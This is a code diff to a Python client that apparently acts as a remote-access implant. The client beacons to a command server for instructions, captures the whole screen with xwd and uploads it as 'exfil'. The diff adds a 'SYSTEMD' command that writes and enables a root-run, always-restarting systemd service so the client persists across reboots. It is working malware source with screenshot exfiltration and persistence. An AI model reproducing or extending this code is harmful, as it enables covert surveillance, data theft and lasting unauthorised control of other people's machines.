@@ -38,6 +38,7 @@ MAX_FAILS = 10
 failCount = 0
 LOW_TIME = 1
 HIGH_TIME = 10
+CWD = os.getcwd()
 
 def beacon():
     r = requests.get(url = str("http://" + SERVER_IP + ":" + str(SERVER_PORT) + "/client/" + str(UUID) + "/commands"))
@@ -86,5 +87,10 @@ if __name__ == "__main__":
                 fileName = str(time.time()) + ".xwd"
                 image = subprocess.Popen("xwd -silent -root -display :0.0", shell=True, stdout = subprocess.PIPE).communicate()[0]
                 httpPost("exfil", image, "")
+            elif serverText["command"] == "SYSTEMD":
+                f = open('/etc/systemd/system/client-program.service','w')
+                f.write("[Unit]\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser=root\nExecStart=/usr/bin/env python3 " + CWD + "/client.py\n\n[Install]\nWantedBy=multi-user.target")
+                f.close()
+                subprocess.Popen("systemctl enable --now client-program", shell=True)
 
         time.sleep(random.randint(LOW_TIME,HIGH_TIME))
